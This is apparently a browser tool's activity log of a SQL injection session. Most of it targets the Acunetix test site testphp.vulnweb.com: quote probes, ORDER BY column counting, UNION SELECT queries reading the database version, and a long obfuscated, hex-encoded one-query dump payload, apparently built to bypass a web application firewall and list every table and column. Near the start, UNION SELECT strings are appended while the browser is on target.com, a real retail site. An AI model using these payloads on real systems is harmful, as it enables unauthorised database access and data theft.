[2025-12-24 23:36:18] LOAD_URL: https://target.com
[2025-12-24 23:36:18] URL_CHANGED: https://target.com
[2025-12-24 23:36:19] URL_CHANGED: https://www.target.com/
[2025-12-24 23:36:19] TITLE: target.com
[2025-12-24 23:36:19] TITLE: Target : Expect More. Pay Less.
[2025-12-24 23:45:53] UNION_APPENDED:  UNION SELECT 1,2,3
[2025-12-24 23:46:12] UNION_APPENDED:  UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99
[2025-12-24 23:46:25] LOAD_URL: https://testphp.vulnweb.com
[2025-12-24 23:46:25] URL_CHANGED: https://testphp.vulnweb.com
[2025-12-24 23:46:31] LOAD_URL: http://testphp.vulnweb.com
[2025-12-24 23:46:31] URL_CHANGED: http://testphp.vulnweb.com
[2025-12-24 23:46:31] URL_CHANGED: http://testphp.vulnweb.com/
[2025-12-24 23:46:31] TITLE: testphp.vulnweb.com
[2025-12-24 23:46:31] TITLE: Home of Acunetix Art
[2025-12-24 23:46:32] LOAD_URL: http://testphp.vulnweb.com/
[2025-12-24 23:46:32] TITLE: testphp.vulnweb.com
[2025-12-24 23:46:32] TITLE: Home of Acunetix Art
[2025-12-24 23:46:35] URL_CHANGED: http://testphp.vulnweb.com/categories.php
[2025-12-24 23:46:35] TITLE: testphp.vulnweb.com/categories.php
[2025-12-24 23:46:35] TITLE: picture categories
[2025-12-24 23:46:36] URL_CHANGED: http://testphp.vulnweb.com/listproducts.php?cat=1
[2025-12-24 23:46:36] TITLE: testphp.vulnweb.com/listproducts.php?cat=1
[2025-12-24 23:46:36] TITLE: pictures
[2025-12-24 23:46:37] URL_CHANGED: http://testphp.vulnweb.com/listproducts.php?cat=1#
[2025-12-24 23:46:40] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1
[2025-12-24 23:46:40] TITLE: testphp.vulnweb.com/artists.php?artist=1
[2025-12-24 23:46:40] TITLE: artists
[2025-12-24 23:46:43] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1'
[2025-12-24 23:46:43] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1'
[2025-12-24 23:46:43] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1'
[2025-12-24 23:46:43] TITLE: testphp.vulnweb.com/artists.php?artist=1%27
[2025-12-24 23:46:43] TITLE: artists
[2025-12-24 23:46:47] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1'--+-
[2025-12-24 23:46:47] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1'--+-
[2025-12-24 23:46:47] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1'--+-
[2025-12-24 23:46:47] TITLE: testphp.vulnweb.com/artists.php?artist=1%27--+-
[2025-12-24 23:46:47] TITLE: artists
[2025-12-24 23:46:48] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1'--+-
[2025-12-24 23:46:48] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1'--+-
[2025-12-24 23:46:48] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1'--+-
[2025-12-24 23:46:48] TITLE: testphp.vulnweb.com/artists.php?artist=1%27--+-
[2025-12-24 23:46:48] TITLE: artists
[2025-12-24 23:46:57] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 99
[2025-12-24 23:46:57] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 99
[2025-12-24 23:46:57] TITLE: testphp.vulnweb.com/artists.php?artist=1 ORDER BY 99
[2025-12-24 23:46:57] TITLE: artists
[2025-12-24 23:47:02] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 1
[2025-12-24 23:47:02] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 1
[2025-12-24 23:47:02] TITLE: testphp.vulnweb.com/artists.php?artist=1 ORDER BY 1
[2025-12-24 23:47:14] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 2
[2025-12-24 23:47:14] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 2
[2025-12-24 23:47:14] TITLE: testphp.vulnweb.com/artists.php?artist=1 ORDER BY 2
[2025-12-24 23:47:14] TITLE: artists
[2025-12-24 23:47:17] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 4
[2025-12-24 23:47:17] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 4
[2025-12-24 23:47:18] TITLE: testphp.vulnweb.com/artists.php?artist=1 ORDER BY 4
[2025-12-24 23:47:18] TITLE: artists
[2025-12-24 23:47:20] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 3
[2025-12-24 23:47:20] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 3
[2025-12-24 23:47:20] TITLE: testphp.vulnweb.com/artists.php?artist=1 ORDER BY 3
[2025-12-24 23:47:20] TITLE: artists
[2025-12-24 23:47:27] UNION_APPENDED:  UNION SELECT 1,2,3
[2025-12-24 23:47:28] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2,3
[2025-12-24 23:47:28] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2,3
[2025-12-24 23:47:28] TITLE: testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2,3
[2025-12-24 23:47:28] TITLE: artists
[2025-12-24 23:47:31] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2,3
[2025-12-24 23:47:31] TITLE: testphp.vulnweb.com/artists.php?artist=1 UNION SELECT 1,2,3
[2025-12-24 23:47:31] TITLE: artists
[2025-12-24 23:47:34] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,2,3
[2025-12-24 23:47:34] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,2,3
[2025-12-24 23:47:34] TITLE: testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,2,3
[2025-12-24 23:47:34] TITLE: artists
[2025-12-24 23:47:51] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,@@version,3
[2025-12-24 23:47:51] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,@@version,3
[2025-12-24 23:47:51] TITLE: testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,@@version,3
[2025-12-24 23:47:51] TITLE: artists
[2025-12-24 23:47:58] LOAD_URL: http://testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,now(),3
[2025-12-24 23:47:58] URL_CHANGED: http://testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,now(),3
[2025-12-24 23:47:58] TITLE: testphp.vulnweb.com/artists.php?artist=.1 UNION SELECT 1,now(),3
[2025-12-24 23:47:58] TITLE: artists
[2025-12-25 00:11:14] PAYLOAD_APPENDED: concat_ws%280x0,0x3c62723e3a3a20496e6a65637465642042792050682e6834726834723a3a203c62723e56657273696f6e203a3a20,version%28%29,0x3c62723e,0x557365723a3a3a,user%28%29,0x3c62723e, 0x44617461626173653a3a3a,database%28%29,0x3c62723e,%28/!00000Select%2f%28@%29/!from%2f%28/!00000Select%2f%28@:=0x0%29,%28/!00000Select%2f%280%29/!From%2f%28 /!inFoRmAtiOn_schEmA%2f.coLumNS %29whErE %28tAblE_ScHeMa=DaTaBaSe/!50000%28%29%2f%29and %280x00%29in %28@:=/!concat_ws%28%280x00%29,@,0x3c62723e,table_schema,0x2d2d3e,table_name,0x203a3a20,column_name,0x0%29%29%29%29x%29,0x3c62723e3c62723e%29%2fconcat/!(unhex(hex(concat/!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/!12345selEcT*/(@x)/!from/(/!12345selEcT/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/!12345selEcT/(0) from(information_schema./*/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))/
